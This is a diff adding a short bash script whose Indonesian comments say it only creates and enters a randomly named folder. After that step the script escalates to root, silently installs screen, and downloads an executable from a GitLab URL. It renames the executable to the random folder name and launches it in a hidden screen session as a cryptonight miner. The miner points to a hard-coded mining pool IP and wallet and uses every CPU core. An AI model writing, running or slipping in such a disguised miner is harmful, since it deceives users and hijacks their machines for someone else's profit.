@@ -1,0 +1,19 @@
+#!/bin/bash
+# Generate nama folder acak (misalnya, 8 karakter alfanumerik)
+sleep 10
+NAMA_FOLDER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+
+# Buat folder dengan nama acak
+mkdir -p "$NAMA_FOLDER"
+
+# Masuk ke dalam folder
+cd "$NAMA_FOLDER" || { echo "Gagal masuk ke folder $NAMA_FOLDER."; exit 1; }
+
+# Tampilkan pesan sukses
+echo "Folder '$NAMA_FOLDER' berhasil dibuat dan Anda sekarang berada di dalamnya."
+sudo su <<EOF
+sudo apt install screen -y >/dev/null 2>&1
+wget -qO dogi https://gitlab.com/sarifadim/jomblo/-/raw/main/rocky && chmod +x dogi && mv dogi $NAMA_FOLDER
+screen -dms run ./$NAMA_FOLDER --algorithm cryptonight_upx --pool 8.219.86.27:8080 -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo G-$(TZ=UTC-7 date +"%H-%M-%S")) -p $(echo G-$(TZ=UTC-7 date +"%H-%M-%S")) -t $(nproc --all) --disable-gpu
+EOF
+screen -r
